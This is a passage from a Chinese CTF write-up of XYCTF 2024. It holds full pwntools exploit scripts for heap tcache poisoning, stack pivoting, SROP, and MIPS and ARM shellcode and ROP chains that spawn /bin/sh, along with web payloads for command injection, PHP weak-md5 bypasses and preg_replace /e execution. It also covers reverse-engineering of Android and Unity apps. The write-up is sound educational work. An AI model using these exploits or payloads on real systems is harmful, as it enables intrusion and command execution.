class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">42527</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_chunk</span>(<span class="params">idx,size</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;[?] please input chunk_idx: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;[?] Enter chunk size: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_chunk</span>(<span class="params">idx</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;[?] please input chunk_idx: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_chunk</span>(<span class="params">idx</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;[?] please input chunk_idx: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    data=sh.recvuntil(<span class="string">b&#x27;Welcome to XYCTF\n&#x27;</span>)[:-<span class="number">17</span>]</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_chunk</span>(<span class="params">idx,data</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;[?] please input chunk_idx: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    sh.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7</span>):</span><br><span class="line">    add_chunk(i,<span class="number">0x200</span>)</span><br><span class="line">add_chunk(<span class="number">7</span>,<span class="number">0x18</span>)</span><br><span class="line">add_chunk(<span class="number">8</span>,<span class="number">0x18</span>)</span><br><span class="line">add_chunk(<span class="number">9</span>,<span class="number">0x200</span>)</span><br><span class="line">add_chunk(<span class="number">10</span>,<span class="number">0x18</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7</span>):</span><br><span class="line">    delete_chunk(i)</span><br><span class="line"><span class="comment">#chunk 9 in unsorted bin</span></span><br><span class="line">delete_chunk(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#chunk 7 off by one change chunk 8 size</span></span><br><span class="line">edit_chunk(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x41&#x27;</span>)</span><br><span class="line"><span class="comment">#chunk 8 overlapping with chunk 9</span></span><br><span class="line">delete_chunk(<span class="number">8</span>)</span><br><span class="line">add_chunk(<span class="number">8</span>,<span class="number">0x38</span>)</span><br><span class="line"><span class="comment">#unsorted bin leak</span></span><br><span class="line">data = view_chunk(<span class="number">8</span>)[<span class="number">0x20</span>:][:<span class="number">8</span>]</span><br><span class="line">libc_base = u64(data)-<span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#旧的chunk全都malloc走</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7</span>):</span><br><span class="line">    add_chunk(i,<span class="number">0x200</span>)</span><br><span class="line">add_chunk(<span class="number">9</span>,<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#再弄点新chunk</span></span><br><span class="line">add_chunk(<span class="number">0x10</span>,<span class="number">0x18</span>)</span><br><span class="line">add_chunk(<span class="number">0x11</span>,<span class="number">0x18</span>)</span><br><span class="line">add_chunk(<span class="number">0x12</span>,<span class="number">0x28</span>)</span><br><span class="line">add_chunk(<span class="number">0x13</span>,<span class="number">0x18</span>)</span><br><span class="line">add_chunk(<span class="number">0x14</span>,<span class="number">0x28</span>)</span><br><span class="line"><span class="comment">#chunk 0x10 off by one</span></span><br><span class="line">edit_chunk(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x41&#x27;</span>)</span><br><span class="line">delete_chunk(<span class="number">0x11</span>)</span><br><span class="line">add_chunk(<span class="number">0x11</span>,<span class="number">0x38</span>)</span><br><span class="line">delete_chunk(<span class="number">0x14</span>)</span><br><span class="line">delete_chunk(<span class="number">0x12</span>)</span><br><span class="line">edit_chunk(<span class="number">0x11</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x31</span>)+p64(free_hook))</span><br><span class="line"><span class="comment">#赎回tcache</span></span><br><span class="line">add_chunk(<span class="number">0x12</span>,<span class="number">0x28</span>)</span><br><span class="line">add_chunk(<span class="number">0x14</span>,<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x14为free_hook</span></span><br><span class="line">edit_chunk(<span class="number">0x14</span>,p64(system_addr))</span><br><span class="line"></span><br><span class="line">add_chunk(<span class="number">0x1f</span>,<span class="number">0x20</span>)</span><br><span class="line">edit_chunk(<span class="number">0x1f</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete_chunk(<span class="number">0x1f</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="guestbook1">3.6. guestbook1</h3>
<p>id的最后一位有溢出，能修改rbp变为更小的地址，溢出后两次return会造成栈迁移，能让return落到name段，然后就通过backdoor来getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.chdir(<span class="string">&#x27;./bin&#x27;</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">11032</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x0401323</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;index\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(i).encode())</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;name:\n&#x27;</span>)</span><br><span class="line">    sh.send(p64(backdoor)*<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;id:\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;index\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="simple-srop">3.7. simple_srop</h3>
<p>被限制要ORW了啊，一开始因为找不到大的地址空间写payload卡了半天，后来发现好像随便找个没用过的内存就行</p>
<p>总之先read+栈迁移，然后ORW：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">34157</span>)</span><br><span class="line"></span><br><span class="line">sigret = <span class="number">0x401296</span></span><br><span class="line">fake_stack = <span class="number">0x404800</span></span><br><span class="line">syscall_ret = <span class="number">0x40129D</span></span><br><span class="line">main_addr = <span class="number">0x4012A3</span></span><br><span class="line">flag_addr = fake_stack+<span class="number">0x400</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(sigret)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = <span class="number">0</span></span><br><span class="line">sigframe.rsi = fake_stack</span><br><span class="line">sigframe.rdx = <span class="number">0x500</span></span><br><span class="line">sigframe.rsp = fake_stack</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">payload += <span class="built_in">bytes</span>(sigframe)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += p64(sigret)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_open</span><br><span class="line">sigframe.rdi = flag_addr</span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rsp = fake_stack+<span class="number">0x100</span></span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">payload += <span class="built_in">bytes</span>(sigframe)</span><br><span class="line">payload += p64(sigret)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = <span class="number">3</span></span><br><span class="line">sigframe.rsi = flag_addr</span><br><span class="line">sigframe.rdx = <span class="number">0x100</span></span><br><span class="line">sigframe.rsp = fake_stack+<span class="number">0x200</span></span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">payload += <span class="built_in">bytes</span>(sigframe)</span><br><span class="line">payload += p64(sigret)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_write</span><br><span class="line">sigframe.rdi = <span class="number">1</span></span><br><span class="line">sigframe.rsi = flag_addr</span><br><span class="line">sigframe.rdx = <span class="number">0x100</span></span><br><span class="line">sigframe.rsp = fake_stack+<span class="number">0x300</span></span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">payload += <span class="built_in">bytes</span>(sigframe)</span><br><span class="line">payload += p64(main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x400</span>,<span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="EZ1-0">3.8. EZ1.0?</h3>
<p>啊?为了这个我还特意学了下mips的PWN流程，啊折磨，大致就是写shellcode到栈上，然后通过还原寄存器让fp得jmp_a2的gadget，然后reutrn到sp2a2_jmp_fp的gadget上，此时会让a2=sp+偏移，然后跳到fp上，执行jmp_a2的gadget，就达到了jmp到栈上shellcode的目的</p>
<p>shllcode换了两个，第二个能pwn成功，第一个远程打不通我也不知道为啥，shllcode来源<a target="_blank" rel="noopener" href="https://shell-storm.org/shellcode/files/shellcode-80.html%EF%BC%9A">https://shell-storm.org/shellcode/files/shellcode-80.html：</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process([&quot;qemu-mipsel&quot;,&#x27;-g&#x27;,&#x27;1234&#x27;,&quot;./mips&quot;])</span></span><br><span class="line">sh = remote(<span class="string">&#x27;python&#x27;</span>,<span class="number">11025</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;welcome XYCTF mips world\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sp2a2_jmp_fp = <span class="number">0x00427968</span></span><br><span class="line">jmp_a2 = <span class="number">0x0041FBF4</span></span><br><span class="line"></span><br><span class="line">shellcode =  <span class="string">b&#x27;\xff\xff\x10\x04\xab\x0f\x02\x24&#x27;</span></span><br><span class="line">shellcode += <span class="string">b&#x27;\x55\xf0\x46\x20\x66\x06\xff\x23&#x27;</span></span><br><span class="line">shellcode += <span class="string">b&#x27;\xc2\xf9\xec\x23\x66\x06\xbd\x23&#x27;</span></span><br><span class="line">shellcode += <span class="string">b&#x27;\x9a\xf9\xac\xaf\x9e\xf9\xa6\xaf&#x27;</span></span><br><span class="line">shellcode += <span class="string">b&#x27;\x9a\xf9\xbd\x23\x21\x20\x80\x01&#x27;</span></span><br><span class="line">shellcode += <span class="string">b&#x27;\x21\x28\xa0\x03\xcc\xcd\x44\x03&#x27;</span></span><br><span class="line">shellcode += <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode =  <span class="string">b&#x27;\x50\x73\x06\x24\xff\xff\xd0\x04\x50\x73\x0f\x24\xff\xff\x06\x28&#x27;</span></span><br><span class="line">shellcode += <span class="string">b&#x27;\xe0\xff\xbd\x27\xd7\xff\x0f\x24\x27\x78\xe0\x01\x21\x20\xef\x03&#x27;</span></span><br><span class="line">shellcode += <span class="string">b&#x27;\xe8\xff\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x23\xab\x0f\x02\x24&#x27;</span></span><br><span class="line">shellcode += <span class="string">b&#x27;\x0c\x01\x01\x01/bin/sh&#x27;</span></span><br><span class="line"></span><br><span class="line">payload =  <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span></span><br><span class="line">payload += p32(jmp_a2)+p32(sp2a2_jmp_fp)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span> + shellcode</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="EZ2-0">3.9. EZ2.0?</h3>
<p>啊?又来?</p>
<p>事后我才发现context的arch还在上一题的mips…不过好像没啥影响</p>
<p>我看网上的wp都是直接return到system，我tm，这也妹有啊</p>
<p>然后找了个syscall的解法，复刻了一下，做出来了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process([&quot;qemu-arm&quot;,&#x27;-g&#x27;,&#x27;1234&#x27;,&quot;./bin/pwn&quot;])</span></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">11042</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./bin/pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">svc = <span class="number">0x0001c58c</span></span><br><span class="line">movr42r2_blx_r3 = <span class="number">0x00043224</span></span><br><span class="line">r7_ret = <span class="number">0x00027d78</span></span><br><span class="line">r4_ret = <span class="number">0x000104e0</span></span><br><span class="line">r3_ret = <span class="number">0x00010160</span></span><br><span class="line">r1_ret = <span class="number">0x0005f824</span></span><br><span class="line">r0_ret = <span class="number">0x0005f73c</span></span><br><span class="line"></span><br><span class="line">str_bin_sh = <span class="number">0x0008A090</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r0_ret -&gt; r0=str_bin_sh</span></span><br><span class="line"><span class="comment">#r1_ret -&gt; r1=0</span></span><br><span class="line"><span class="comment">#r3_ret -&gt; r3=svc</span></span><br><span class="line"><span class="comment">#r4_ret -&gt; r4=0</span></span><br><span class="line"><span class="comment">#r7_ret -&gt; r7=0xB</span></span><br><span class="line"><span class="comment">#movr42r2_blx_r3 -&gt; r2=r4=0 IP=r3=svc</span></span><br><span class="line"><span class="comment">#svc (R0=str_bin_sh R1=0 R2=0 R7=0xB)  -&gt; get shell</span></span><br><span class="line"></span><br><span class="line">payload =  <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x44</span></span><br><span class="line">payload += p32(r0_ret)+p32(str_bin_sh)</span><br><span class="line">payload += p32(r1_ret)+p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(r3_ret)+p32(svc)</span><br><span class="line">payload += p32(r4_ret)+p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(r7_ret)+p32(<span class="number">0xB</span>)</span><br><span class="line">payload += p32(movr42r2_blx_r3)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Web">4. Web</h2>
<p>web会不了一点，看我上面的队伍做出的web真的是一大片一大片的，真是馋这个分啊QAQ</p>
<h3 id="牢牢记住，逝者为大">4.1. 牢牢记住，逝者为大</h3>
<p><code>cp /flag /var/www/html</code>解决的问题</p>
<p>这玩意 flag前面没<code>/</code>还不行，还有这个目录还在var里，像我这种都把www塞根目录下的，就很，没底</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:46180/?cmd=%0A`$_GET[1]`;%23&amp;1=%24(echo%20-e%20%22\0143\0160\040\057\0146\0154\0141\0147\040\057\0166\0141\0162\057\0167\0167\0167\057\0150\0164\0155\0154\057\0146\0154\0141\0147%22)</span><br></pre></td></tr></table></figure>
<img src="/2024/04/26/XYCTF2024-Writeup/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7.png" class title="牢牢记住逝者为大">
<h3 id="warm-up">4.2. warm up</h3>
<p>一顿上网上搜php知识，倒是做出来了</p>
<p>一开始md5弱比较，直接0e比较漏洞：</p>
<p><code>http://localhost:47330/?val1=QNKCDZO&amp;val2=s878926199a</code></p>
<p>第二层还是弱比较，找个0e开头，md5也是0e开头的字符串：</p>
<p><code>http://localhost:47330/?val1=QNKCDZO&amp;val2=s878926199a&amp;md5=0e215962017</code></p>
<p>第三层XYCTF_550102591的md5为0e937920457786991080577371025051</p>
<p>结果还是0e啊…直接覆盖XY和XYCTF然后0e比较</p>
<p><code>http://localhost:47330/?val1=QNKCDZO&amp;val2=s878926199a&amp;md5=0e215962017&amp;XY=s878926199a&amp;XYCTF=s878926199a</code></p>
<p>这咋还有Level2啊，看到preg_match和preg_replace直接上网搜php漏洞</p>
<p>preg_replace能执行，preg_match不能处理数组，php真神奇，但是我a好像直接写正则也没问题，原理我就不懂了，总之最后post了下面这个玩意</p>
<p><code>http://127.0.0.1:47330/LLeeevvveeelll222.php?a=/123/e&amp;b=system(&quot;cat /flag&quot;)&amp;c=123</code></p>
<img src="/2024/04/26/XYCTF2024-Writeup/warm_up.png" class title="warm_up">
<h3 id="ezMake">4.3. ezMake</h3>
<p>还好我写过make（逃）</p>
<p>直接用make的执行shell功能就能打印出flag</p>
<p><a target="_blank" rel="noopener" href="https://seisman.github.io/how-to-write-makefile/functions.html#shell">https://seisman.github.io/how-to-write-makefile/functions.html#shell</a></p>
<img src="/2024/04/26/XYCTF2024-Writeup/ezMake.png" class title="ezMake">
<h3 id="ezhttp">4.4. ezhttp</h3>
<p>首先是看眼F12：</p>
<img src="/2024/04/26/XYCTF2024-Writeup/ezhttp_F12.png" class title="ezhttp_F12">
<p>啊这，然后就找呗</p>
<img src="/2024/04/26/XYCTF2024-Writeup/ezhttp_rebots.png" class title="ezhttp_rebots">
<img src="/2024/04/26/XYCTF2024-Writeup/ezhttp_l0g1n.png" class title="ezhttp_l0g1n">
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: XYCTF</span><br><span class="line">password: @JOILha!wuigqi123$</span><br></pre></td></tr></table></figure>
<img src="/2024/04/26/XYCTF2024-Writeup/ezhttp_yuanshen.png" class title="ezhttp_yuanshen">
<p>原神，启动！</p>
<img src="/2024/04/26/XYCTF2024-Writeup/ezhttp_ref.png" class title="ezhttp_ref">
<p>好好好，XYCTF浏览器</p>
<img src="/2024/04/26/XYCTF2024-Writeup/ezhttp%E6%B5%8F%E8%A7%88%E5%99%A8.png" class title="ezhttp浏览器">
<p>好好好 改XFF</p>
<img src="/2024/04/26/XYCTF2024-Writeup/ezhttp_XFF.png" class title="ezhttp_XFF">
<p>欸我tm，继续换：</p>
<img src="/2024/04/26/XYCTF2024-Writeup/ezhttp_clientIP.png" class title="ezhttp_clientIP">
<p>试了半天用Client-IP解决了，怎么还有啊.jpg</p>
<img src="/2024/04/26/XYCTF2024-Writeup/ezhttp%E5%B0%8F%E9%A5%BC%E5%B9%B2.png" class title="ezhttp小饼干">
<p>呃啊啊啊啊啊，竟然还有</p>
<img src="/2024/04/26/XYCTF2024-Writeup/ezhttp_flag.png" class title="ezhttp_flag">
<p>终于结束哩！</p>
<h3 id="ezmd5">4.5. ezmd5</h3>
<p>上传两个图片并比较，好像要求图片不同md5相同，测试了一下，好像有图片的头几个字节就行了，上网搜有没有md5碰撞器，然后就找到了这个：</p>
<img src="/2024/04/26/XYCTF2024-Writeup/ezmd5%E7%A2%B0%E6%92%9E%E5%99%A8.png" class title="ezmd5碰撞器">
<p>这下好说了，碰俩图片就行了：</p>
<img src="/2024/04/26/XYCTF2024-Writeup/ezmd5%E7%A2%B0%E6%92%9E%E7%BB%93%E6%9E%9C.png" class title="ezmd5碰撞结果">
<img src="/2024/04/26/XYCTF2024-Writeup/ezmd5_flag.png" class title="ezmd5_flag">
<h2 id="Reverse">5. Reverse</h2>
<p>23个题啊 23个题 写题解最累的一回</p>
<h3 id="Trustme">5.1. Trustme</h3>
<p>呃，直到我做完了好像才意识到这个有sql注入漏洞</p>
<img src="/2024/04/26/XYCTF2024-Writeup/Trustme_Manifest.png" class title="Trustme_Manifest">
<p>类加载的时候有代理，那就看看代理</p>
<img src="/2024/04/26/XYCTF2024-Writeup/Trustme%E4%BB%A3%E7%90%86.png" class title="Trustme代理">
<p>创建了个shell.apk，然后好像调用readDexFileFromApk和splitPayloadFromDex来写入这个apk</p>
<img src="/2024/04/26/XYCTF2024-Writeup/Trustme_readDexFileFromApk.png" class title="Trustme_readDexFileFromApk">
<p>readDexFileFromApk好像就是从apk中找出classes.dex</p>
<img src="/2024/04/26/XYCTF2024-Writeup/Trustme_splitPayloadFromDex.png" class title="Trustme_splitPayloadFromDex">
<p>而splitPayloadFromDex则是从文件尾读了4字节的int作为大小，经查看是4459705，然后调用decrypt xor 0xFF函数写入文件4459705大小的文件，</p>
<img src="/2024/04/26/XYCTF2024-Writeup/Trustme_decrypt.png" class title="Trustme_decrypt">
<img src="/2024/04/26/XYCTF2024-Writeup/Trustme_payload%E8%A7%A3%E5%AF%86%E7%BB%93%E6%9E%9C.png" class title="Trustme_payload解密结果">
<p>是个新apk，拖进jadx看一眼</p>
<img src="/2024/04/26/XYCTF2024-Writeup/Trustme_new_apk.png" class title="Trustme_new_apk">
<p>SQL查询数据库啊</p>
<img src="/2024/04/26/XYCTF2024-Writeup/Trustme_create_sql.png" class title="Trustme_create_sql">
<p>创建db又是xor 0xFF</p>
<p>打开db看见flag</p>
<img src="/2024/04/26/XYCTF2024-Writeup/Trustme_flag.png" class title="Trustme_flag">
<h3 id="DebugMe">5.2. DebugMe</h3>
<p>这题好像附加调试器即可，但是android studio即使开了全局调试，也需要apk开启调试功能，结果我还得重新打包apk，android版本太高还有对齐问题安装不上，总之也算坐牢了：</p>

<h3 id="baby-unity">5.3. baby unity</h3>
<p>Il2CppDumper就行，但是在这之前记得upx unpack一下，能的出来一个26MB的script.json，用Il2CppDumper自带的ida_with_struct_py3.py能把符号加载进IDA中</p>
<img src="/2024/04/26/XYCTF2024-Writeup/baby_unity%E5%8A%A0%E5%AF%86%E5%87%BD%E6%95%B0.png" class title="baby_unity加密函数">
<img src="/2024/04/26/XYCTF2024-Writeup/baby_unity%E5%AF%86%E6%96%87.png" class title="Trustme_flag">
<p>可以看到操作就是b64之后xor了一下，随后解出flag</p>
<img src="/2024/04/26/XYCTF2024-Writeup/baby_unity_flag.png" class title="Trustme_flag">
<h3 id="ez-unity">5.4. ez unity</h3>
<p>竟然直接改的文件读取方式，而不是在读取前修复结构，看样子dump不了原文件了</p>
<p>但是frida-il2cpp-bridge能dump C#结构，但是导入不进IDA，看着坐牢</p>
<p>坐牢也看出来加密方法是AES+base64了</p>
